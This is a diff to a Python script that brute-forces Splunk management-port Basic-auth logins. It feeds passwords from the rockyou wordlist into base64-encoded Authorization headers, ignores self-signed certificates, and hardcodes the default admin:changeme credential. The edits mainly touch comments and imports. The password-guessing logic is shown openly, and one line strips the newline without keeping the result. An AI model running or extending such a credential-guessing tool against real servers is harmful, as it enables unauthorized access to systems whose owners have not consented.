@@ -1,5 +1,4 @@
 import requests
-from concurrent.futures import ThreadPoolExecutor, as_completed
 import argparse
 import base64
 
@@ -9,7 +8,7 @@ DEFAULT_PASS = 'changeme'
 WORDLIST = '/usr/share/wordlists/rockyou.txt'
 THREADS = 20
 
-baseCreds = 'YWRtaW46Y2hhbmdlbWU=' # Combinations of user:pass in base64
+baseCreds = 'YWRtaW46Y2hhbmdlbWU=' # Combination of user:pass in base64
 head = {'Authorization': f'Basic {baseCreds}'}
 
 # Disable SSL warnings (Splunk often uses self-signed certs)
@@ -17,6 +16,7 @@ requests.packages.urllib3.disable_warnings(
     requests.packages.urllib3.exceptions.InsecureRequestWarning
 )
 
+# encode creds to base64 (since splunkd take them like that)
 def generate_creds(password):
     join_creds = f'{USERNAME}:{password}'
     join_creds_bytes = join_creds.encode('ascii')
@@ -43,7 +43,7 @@ def main():
     with open(args.wordlist, "r", encoding="latin-1") as file_obj:
         # Iterate directly over the file (no readline) to save memory
         for pwd in file_obj:
-            pwd.strip() # remove the newline
+            pwd.strip() # Remove the newline
             head = generate_creds(pwd)
             if args.debug:
                 print(head)
